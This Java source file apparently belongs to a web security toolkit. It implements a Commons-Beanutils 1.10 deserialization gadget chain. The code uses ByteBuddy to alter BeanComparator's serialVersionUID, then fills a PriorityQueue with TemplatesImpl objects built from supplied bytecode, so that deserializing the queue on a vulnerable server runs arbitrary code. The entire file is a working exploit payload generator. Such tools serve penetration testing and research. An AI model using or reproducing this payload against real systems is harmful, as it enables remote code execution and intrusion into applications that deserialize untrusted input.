package com.reajason.javaweb.deserialize.payload;

import com.reajason.javaweb.deserialize.Payload;
import com.reajason.javaweb.deserialize.TemplateUtils;
import com.reajason.javaweb.deserialize.utils.Reflections;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.description.modifier.FieldManifestation;
import net.bytebuddy.description.modifier.Ownership;
import net.bytebuddy.description.modifier.Visibility;
import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
import org.apache.commons.beanutils.BeanComparator;

import java.net.URL;
import java.net.URLClassLoader;
import java.util.Comparator;
import java.util.PriorityQueue;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/3
 */
public class CommonsBeanutils110 implements Payload {
    @Override
    @SneakyThrows
    public Object generate(byte[] bytes) {
        Object comparator = new ByteBuddy()
                .redefine(BeanComparator.class)
                .field(named("serialVersionUID"))
                .value(1L).make()
                .load(new URLClassLoader(new URL[]{}), ClassLoadingStrategy.Default.INJECTION).getLoaded()
                .getDeclaredConstructor(String.class, Comparator.class)
                .newInstance(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, ((Comparator) comparator));
        queue.add("1");
        queue.add("1");
        Object obj = TemplateUtils.createTemplatesImpl(bytes);
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
        return queue;
    }
}